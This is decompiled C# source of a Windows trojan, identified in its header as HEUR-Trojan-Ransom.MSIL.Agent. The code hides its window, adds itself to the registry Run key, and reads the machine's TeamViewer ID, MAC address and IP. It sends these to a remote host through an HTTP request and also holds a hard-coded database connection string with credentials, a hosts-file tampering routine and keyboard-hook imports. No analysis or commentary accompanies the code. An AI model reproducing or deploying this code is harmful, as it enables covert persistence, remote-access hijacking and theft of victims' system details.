// Decompiled with JetBrains decompiler
// Type: hardworking.Form2
// Assembly: hardworking, Version=1.0.0.0, Culture=neutral, PublicKeyToken=18ccce85020f340c
// MVID: C40E4E90-4480-4BF5-B270-6473C594BC1D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Ransom.MSIL.Agent.gen-10b83441122e6b29cb4077df735e8afd3270117f267e7e814cfe17e50aee75c1.exe

using Microsoft.Win32;
using MySql.Data.MySqlClient;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace hardworking
{
  public class Form2 : Form
  {
    private MySqlConnection conn;
    private string sMacAddress = string.Empty;
    private string mac;
    private string pc_locked;
    private string Teamviewerstring = string.Empty;
    private string country = "JP";
    private string cp_disable;
    private string taskmanager;
    private string host_file;
    private string path;
    private string connString = "SERVER=107.180.3.171; PORT=3306; DATABASE=computer_details; UID=computer_details; PASSWORD=admin@password";
    private IntPtr ptrHook;
    private Form2.LowLevelKeyboardProc objKeyboardProcess;
    private IContainer components;

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(
      int id,
      Form2.LowLevelKeyboardProc callback,
      IntPtr hMod,
      uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool UnhookWindowsHookEx(IntPtr hook);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(
      IntPtr hook,
      int nCode,
      IntPtr wp,
      IntPtr lp);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string name);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern short GetAsyncKeyState(Keys key);

    public static bool ModifyHostsFile(string entry)
    {
      try
      {
        using (StreamWriter streamWriter = System.IO.File.AppendText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers\\etc\\hosts")))
        {
          streamWriter.WriteLine(entry);
          return true;
        }
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
        return false;
      }
    }

    public Form2()
    {
      this.InitializeComponent();
      this.Hide();
      this.MinimizeBox = false;
      this.MaximizeBox = false;
      this.ControlBox = false;
      Form2.GetTeamviewerID();
      GetTeamViewerId();
      foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
      {
        if (this.sMacAddress == string.Empty)
        {
          networkInterface.GetIPProperties();
          this.sMacAddress = networkInterface.GetPhysicalAddress().ToString();
        }
      }

      long GetTeamViewerId()
      {
        try
        {
          string name1 = Environment.Is64BitOperatingSystem ? "SOFTWARE\\Wow6432Node\\TeamViewer" : "SOFTWARE\\TeamViewer";
          RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name1);
          if (registryKey == null)
            return 0;
          object obj1 = registryKey.GetValue("ClientID");
          this.Teamviewerstring = obj1.ToString();
          if (obj1 != null)
            return Convert.ToInt64(obj1);
          foreach (string name2 in ((IEnumerable<string>) registryKey.GetSubKeyNames()).Reverse<string>())
          {
            object obj2 = registryKey.OpenSubKey(name2).GetValue("ClientID");
            int num = (int) MessageBox.Show(obj2.ToString());
            if (obj2 != null)
              return Convert.ToInt64(obj2);
          }
          return 0;
        }
        catch (Exception ex)
        {
          return 0;
        }
      }
    }

    public static string GetTeamviewerID()
    {
      List<string> list = ((IEnumerable<string>) new string[7]
      {
        "4",
        "5",
        "5.1",
        "6",
        "7",
        "8",
        "14"
      }).Reverse<string>().ToList<string>();
      string[] strArray = new string[2]
      {
        "SOFTWARE\\TeamViewer",
        "SOFTWARE\\Wow6432Node\\TeamViewer"
      };
      foreach (string name1 in strArray)
      {
        if (Registry.LocalMachine.OpenSubKey(name1) != null)
        {
          foreach (string str in list)
          {
            string name2 = string.Format("{0}\\Version{1}", (object) name1, (object) str);
            if (Registry.LocalMachine.OpenSubKey(name2) != null)
            {
              object obj = Registry.LocalMachine.OpenSubKey(name2).GetValue("ClientID");
              if (obj != null)
                return Convert.ToInt32(obj).ToString();
            }
          }
        }
      }
      return string.Empty;
    }

    private void Form2_Load(object sender, EventArgs e)
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      string str = Application.ExecutablePath.ToString();
      registryKey.SetValue("mac testing", (object) str);
      string empty1 = string.Empty;
      string hostName = Dns.GetHostName();
      Console.WriteLine("Local Machine's Host Name: " + hostName);
      IPAddress[] addressList = Dns.GetHostEntry(hostName).AddressList;
      string empty2 = string.Empty;
      for (int index = 0; index < addressList.Length; ++index)
        empty2 = addressList[index].ToString();
      WebBrowser webBrowser = new WebBrowser();
      string currentDirectory = Directory.GetCurrentDirectory();
      webBrowser.Url = new Uri(string.Format("http://gncmdstore.com/api_update.php?id=" + this.sMacAddress + "& ip=" + empty2 + "& TeamViewer_id=" + this.Teamviewerstring + "& country=" + this.country, (object) currentDirectory));
      webBrowser.ScriptErrorsSuppressed = true;
      new Form1().Show();
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(116, 0);
      this.Name = nameof (Form2);
      this.ShowInTaskbar = false;
      this.Text = "C";
      this.WindowState = FormWindowState.Minimized;
      this.Load += new EventHandler(this.Form2_Load);
      this.ResumeLayout(false);
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
  }
}
